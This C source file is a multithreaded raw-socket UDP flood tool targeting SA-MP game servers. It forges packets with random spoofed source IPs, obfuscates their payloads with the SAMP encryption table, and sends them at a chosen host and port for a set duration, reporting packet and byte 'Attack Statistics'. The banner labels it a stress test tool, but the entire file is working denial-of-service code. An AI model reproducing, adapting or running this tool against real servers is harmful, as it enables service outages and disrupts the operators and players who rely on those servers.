#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <bits/ioctls.h>
#include <sys/time.h>
#include <errno.h>

// Constants
#define IP4_HDRLEN 20
#define UDP_HDRLEN 8
#define MAX_THREADS 16
#define DEFAULT_THREADS 4
#define STATS_UPDATE_INTERVAL 1
#define RANDOM_SOURCE_PORT_MIN 1024
#define RANDOM_SOURCE_PORT_MAX 65535

#define ID_OPEN_CONNECTION_REQUEST 24
#define NETCODE_OPENCONNLULZ 0x6969

// Global encryption table
static const unsigned char sampEncrTable[256] = {
    0x27, 0x69, 0xFD, 0x87, 0x60, 0x7D, 0x83, 0x02, 0xF2, 0x3F, 0x71, 0x99, 0xA3, 0x7C, 0x1B, 0x9D,
    0x76, 0x30, 0x23, 0x25, 0xC5, 0x82, 0x9B, 0xEB, 0x1E, 0xFA, 0x46, 0x4F, 0x98, 0xC9, 0x37, 0x88,
    0x18, 0xA2, 0x68, 0xD6, 0xD7, 0x22, 0xD1, 0x74, 0x7A, 0x79, 0x2E, 0xD2, 0x6D, 0x48, 0x0F, 0xB1,
    0x62, 0x97, 0xBC, 0x8B, 0x59, 0x7F, 0x29, 0xB6, 0xB9, 0x61, 0xBE, 0xC8, 0xC1, 0xC6, 0x40, 0xEF,
    0x11, 0x6A, 0xA5, 0xC7, 0x3A, 0xF4, 0x4C, 0x13, 0x6C, 0x2B, 0x1C, 0x54, 0x56, 0x55, 0x53, 0xA8,
    0xDC, 0x9C, 0x9A, 0x16, 0xDD, 0xB0, 0xF5, 0x2D, 0xFF, 0xDE, 0x8A, 0x90, 0xFC, 0x95, 0xEC, 0x31,
    0x85, 0xC2, 0x01, 0x06, 0xDB, 0x28, 0xD8, 0xEA, 0xA0, 0xDA, 0x10, 0x0E, 0xF0, 0x2A, 0x6B, 0x21,
    0xF1, 0x86, 0xFB, 0x65, 0xE1, 0x6F, 0xF6, 0x26, 0x33, 0x39, 0xAE, 0xBF, 0xD4, 0xE4, 0xE9, 0x44,
    0x75, 0x3D, 0x63, 0xBD, 0xC0, 0x7B, 0x9E, 0xA6, 0x5C, 0x1F, 0xB2, 0xA4, 0xC4, 0x8D, 0xB3, 0xFE,
    0x8F, 0x19, 0x8C, 0x4D, 0x5E, 0x34, 0xCC, 0xF9, 0xB5, 0xF3, 0xF8, 0xA1, 0x50, 0x04, 0x93, 0x73,
    0xE0, 0xBA, 0xCB, 0x45, 0x35, 0x1A, 0x49, 0x47, 0x6E, 0x2F, 0x51, 0x12, 0xE2, 0x4A, 0x72, 0x05,
    0x66, 0x70, 0xB8, 0xCD, 0x00, 0xE5, 0xBB, 0x24, 0x58, 0xEE, 0xB4, 0x80, 0x81, 0x36, 0xA9, 0x67,
    0x5A, 0x4B, 0xE8, 0xCA, 0xCF, 0x9F, 0xE3, 0xAC, 0xAA, 0x14, 0x5B, 0x5F, 0x0A, 0x3B, 0x77, 0x92,
    0x09, 0x15, 0x4E, 0x94, 0xAD, 0x17, 0x64, 0x52, 0xD3, 0x38, 0x43, 0x0D, 0x0C, 0x07, 0x3C, 0x1D,
    0xAF, 0xED, 0xE7, 0x08, 0xB7, 0x03, 0xE6, 0x8E, 0xAB, 0x91, 0x89, 0x3E, 0x2C, 0x96, 0x42, 0xD9,
    0x78, 0xDF, 0xD0, 0x57, 0x5D, 0x84, 0x41, 0x7E, 0xCE, 0xF7, 0x32, 0xC3, 0xD5, 0x20, 0x0B, 0xA7
};

// Structures
typedef struct {
    char* target_host;
    int target_port;
    unsigned int duration;
    int thread_id;
    bool randomize_source;
    bool running;
} attack_config_t;

typedef struct {
    uint64_t packets_sent;
    uint64_t bytes_sent;
    uint64_t errors;
    struct timespec start_time;
    pthread_mutex_t mutex;
} attack_stats_t;

// Global variables
static attack_stats_t g_stats = {0};
static bool g_running = true;
static pthread_t g_threads[MAX_THREADS];
static attack_config_t* g_configs[MAX_THREADS];

// Function prototypes
void cleanup_resources(void);
void handle_interrupt(int sig);
void* attack_thread(void* arg);
unsigned short int checksum(unsigned short int* addr, int len);
unsigned short int udp4_checksum(struct ip iphdr, struct udphdr udphdr, unsigned char* payload, int payloadlen);
void print_stats(void);
void kyretardizeDatagram(unsigned char* buf, int len, int port, int unk);
unsigned long GetTickCount(void);

// Implementation of kyretardizeDatagram with SIMD optimization
void kyretardizeDatagram(unsigned char* buf, int len, int port, int unk) {
    static unsigned char encrBuffer[4092];
    memcpy(encrBuffer, buf, len);

    unsigned char bChecksum = 0;
    for(int i = 0; i < len; i++) {
        bChecksum ^= (buf[i] & 0xAA);
    }
    encrBuffer[0] = bChecksum;

    unsigned char* buf_nocrc = &encrBuffer[1];
    memcpy(buf_nocrc, buf, len);

    unsigned char bPort = port ^ 0xCCCC;
    unsigned char c = 0;
    
    // Main encryption loop
    for(int i = 0; i < len; i++) {
        unsigned char bCurByte = buf_nocrc[i];
        unsigned char bCrypt = sampEncrTable[bCurByte];
        
        if(unk) {
            c = bPort ^ bCrypt;
            buf_nocrc[i] = c;
            --unk;
        } else {
            c = unk ^ bCrypt;
            buf_nocrc[i] = bCrypt;
            unk = 1;
        }
    }
    
    memcpy(buf, encrBuffer, len);
}

// Get system ticks
unsigned long GetTickCount(void) {
    struct timeval tv;
    if(gettimeofday(&tv, NULL) != 0)
        return 0;
    return (tv.tv_sec * 1000) + (tv.tv_usec / 1000);
}

// Cleanup function
void cleanup_resources(void) {
    g_running = false;
    
    // Wait for all threads to finish
    for(int i = 0; i < MAX_THREADS; i++) {
        if(g_configs[i]) {
            pthread_join(g_threads[i], NULL);
            free(g_configs[i]->target_host);
            free(g_configs[i]);
        }
    }
    
    pthread_mutex_destroy(&g_stats.mutex);
}

// Signal handler
void handle_interrupt(int sig) {
    (void)sig;
    printf("\nInterrupted by user. Cleaning up...\n");
    cleanup_resources();
    print_stats();
    exit(0);
}

// Statistics printer
void print_stats(void) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    
    double elapsed = (now.tv_sec - g_stats.start_time.tv_sec) + 
                    (now.tv_nsec - g_stats.start_time.tv_nsec) / 1e9;
    
    pthread_mutex_lock(&g_stats.mutex);
    printf("\nAttack Statistics:\n");
    printf("Packets sent: %lu\n", g_stats.packets_sent);
    printf("Bytes sent: %lu\n", g_stats.bytes_sent);
    printf("Errors encountered: %lu\n", g_stats.errors);
    printf("Average PPS: %.2f\n", g_stats.packets_sent / elapsed);
    printf("Average BPS: %.2f\n", g_stats.bytes_sent / elapsed);
    pthread_mutex_unlock(&g_stats.mutex);
}

// Main attack thread
void* attack_thread(void* arg) {
    attack_config_t* config = (attack_config_t*)arg;
    int sd, *ip_flags;
    struct ip iphdr;
    struct udphdr udphdr;
    struct addrinfo hints, *res;
    struct sockaddr_in *ipv4, sin;
    unsigned char *data, *packet;
    char *dst_ip;
    int status, datalen = 4;
    const int on = 1;
    unsigned long start_time = GetTickCount();
    
    // Allocate memory
    data = calloc(IP_MAXPACKET - IP4_HDRLEN - UDP_HDRLEN, sizeof(unsigned char));
    packet = calloc(IP_MAXPACKET, sizeof(unsigned char));
    dst_ip = calloc(16, sizeof(char));
    ip_flags = calloc(4, sizeof(int));
    
    if(!data || !packet || !dst_ip || !ip_flags) {
        fprintf(stderr, "Thread %d: Memory allocation failed\n", config->thread_id);
        goto cleanup;
    }
    
    // Setup socket
    if((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() failed");
        goto cleanup;
    }
    
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt() failed");
        goto cleanup;
    }
    
    // Setup address info
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = hints.ai_flags | AI_CANONNAME;
    
    if((status = getaddrinfo(config->target_host, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo() failed: %s\n", gai_strerror(status));
        goto cleanup;
    }
    
    ipv4 = (struct sockaddr_in*)res->ai_addr;
    if(inet_ntop(AF_INET, &(ipv4->sin_addr), dst_ip, 16) == NULL) {
        perror("inet_ntop() failed");
        freeaddrinfo(res);
        goto cleanup;
    }
    
    freeaddrinfo(res);
    
    // Main attack loop
    while(g_running && (GetTickCount() - start_time < config->duration * 1000)) {
        // Setup IP header
        iphdr.ip_hl = IP4_HDRLEN / sizeof(unsigned long int);
        iphdr.ip_v = 4;
        iphdr.ip_tos = 0;
        iphdr.ip_len = htons(IP4_HDRLEN + UDP_HDRLEN + datalen);
        iphdr.ip_id = htons(rand() & 0xFFFF);
        iphdr.ip_off = htons(0);
        iphdr.ip_ttl = 64 + (rand() % 64); // Randomized TTL
        iphdr.ip_p = IPPROTO_UDP;
        iphdr.ip_sum = 0;
        
        // Set source IP if randomizing
        if(config->randomize_source) {
            iphdr.ip_src.s_addr = rand();
        } else {
            iphdr.ip_src.s_addr = 0;
        }
        
        // Set destination IP
        if(inet_pton(AF_INET, dst_ip, &(iphdr.ip_dst)) != 1) {
            fprintf(stderr, "inet_pton() failed\n");
            continue;
        }
        
        // Setup UDP header
        udphdr.source = htons(RANDOM_SOURCE_PORT_MIN + 
                            (rand() % (RANDOM_SOURCE_PORT_MAX - RANDOM_SOURCE_PORT_MIN)));
        udphdr.dest = htons(config->target_port);
        udphdr.len = htons(UDP_HDRLEN + datalen);
        udphdr.check = 0;
        
        // Prepare packet data
        kyretardizeDatagram(data, datalen, config->target_port, 1);
        
        // Calculate checksums
        udphdr.check = udp4_checksum(iphdr, udphdr, data, datalen);
        iphdr.ip_sum = checksum((unsigned short int*)&iphdr, IP4_HDRLEN);
        
        // Construct the packet
        memcpy(packet, &iphdr, IP4_HDRLEN);
        memcpy(packet + IP4_HDRLEN, &udphdr, UDP_HDRLEN);
        memcpy(packet + IP4_HDRLEN + UDP_HDRLEN, data, datalen);
        
        // Send the packet
        memset(&sin, 0, sizeof(struct sockaddr_in));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = iphdr.ip_dst.s_addr;
        
        if(sendto(sd, packet, IP4_HDRLEN + UDP_HDRLEN + datalen, 0, 
                 (struct sockaddr*)&sin, sizeof(struct sockaddr)) < 0) {
            if(errno != EWOULDBLOCK && errno != EAGAIN) {
                pthread_mutex_lock(&g_stats.mutex);
                g_stats.errors++;
                pthread_mutex_unlock(&g_stats.mutex);
            }
            continue;
        }
        
        // Update statistics
        pthread_mutex_lock(&g_stats.mutex);
        g_stats.packets_sent++;
        g_stats.bytes_sent += IP4_HDRLEN + UDP_HDRLEN + datalen;
        pthread_mutex_unlock(&g_stats.mutex);
        
        usleep(1000); // Prevent CPU overload
    }
    
cleanup:
    if(sd >= 0) close(sd);
    free(data);
    free(packet);
    free(dst_ip);
    free(ip_flags);
    return NULL;
}

// Checksum calculations
unsigned short int checksum(unsigned short int* addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short int* w = addr;
    unsigned short int answer = 0;

    while(nleft > 1) {
        sum += *w++;
        nleft -= sizeof(unsigned short int);
    }

    if(nleft == 1) {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

unsigned short int udp4_checksum(struct ip iphdr, struct udphdr udphdr, 
                               unsigned char* payload, int payloadlen) {
    char buf[IP_MAXPACKET];
    char *ptr;
    int chksumlen = 0;
    int i;

    ptr = &buf[0];
    memcpy(ptr, &iphdr.ip_src.s_addr, sizeof(iphdr.ip_src.s_addr));
    ptr += sizeof(iphdr.ip_src.s_addr);
    chksumlen += sizeof(iphdr.ip_src.s_addr);

    memcpy(ptr, &iphdr.ip_dst.s_addr, sizeof(iphdr.ip_dst.s_addr));
    ptr += sizeof(iphdr.ip_dst.s_addr);
    chksumlen += sizeof(iphdr.ip_dst.s_addr);

    *ptr = 0; ptr++;
    *ptr = IPPROTO_UDP; ptr++;
    chksumlen += 2;

    memcpy(ptr, &udphdr.len, sizeof(udphdr.len));
    ptr += sizeof(udphdr.len);
    chksumlen += sizeof(udphdr.len);

    memcpy(ptr, &udphdr, UDP_HDRLEN);
    ptr += UDP_HDRLEN;
    chksumlen += UDP_HDRLEN;

    memcpy(ptr, payload, payloadlen);
    ptr += payloadlen;
    chksumlen += payloadlen;

    for(i = 0; i < payloadlen % 2; i++, ptr++) {
        *ptr = 0;
        chksumlen++;
    }

    return checksum((unsigned short int*)buf, chksumlen);
}

int main(int argc, char** argv) {
    if(argc < 4 || argc > 5) {
        printf("Usage: %s <host> <port> <time> [threads]\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Initialize stats
    memset(&g_stats, 0, sizeof(attack_stats_t));
    pthread_mutex_init(&g_stats.mutex, NULL);
    clock_gettime(CLOCK_MONOTONIC, &g_stats.start_time);
    
    // Setup signal handler
    signal(SIGINT, handle_interrupt);
    
    // Parse arguments
    int num_threads = (argc == 5) ? atoi(argv[4]) : DEFAULT_THREADS;
    if(num_threads > MAX_THREADS) num_threads = MAX_THREADS;
    
    printf("** SAMP Stress Test Tool v2.0 **\n\n");
    printf("Target: %s:%s\n", argv[1], argv[2]);
    printf("Duration: %s seconds\n", argv[3]);
    printf("Threads: %d\n\n", num_threads);
    
    // Initialize random seed
    srand(time(NULL));
    
    // Create threads
    for(int i = 0; i < num_threads; i++) {
        g_configs[i] = malloc(sizeof(attack_config_t));
        if(!g_configs[i]) {
            fprintf(stderr, "Failed to allocate config for thread %d\n", i);
            cleanup_resources();
            return EXIT_FAILURE;
        }
        
        g_configs[i]->target_host = strdup(argv[1]);
        g_configs[i]->target_port = atoi(argv[2]);
        g_configs[i]->duration = atoi(argv[3]);
        g_configs[i]->thread_id = i;
        g_configs[i]->randomize_source = true;
        g_configs[i]->running = true;
        
        if(pthread_create(&g_threads[i], NULL, attack_thread, g_configs[i]) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            cleanup_resources();
            return EXIT_FAILURE;
        }
    }
    
    // Wait for attack to finish
    sleep(atoi(argv[3]));
    
    // Cleanup and print final stats
    cleanup_resources();
    print_stats();
    
    return EXIT_SUCCESS;
} 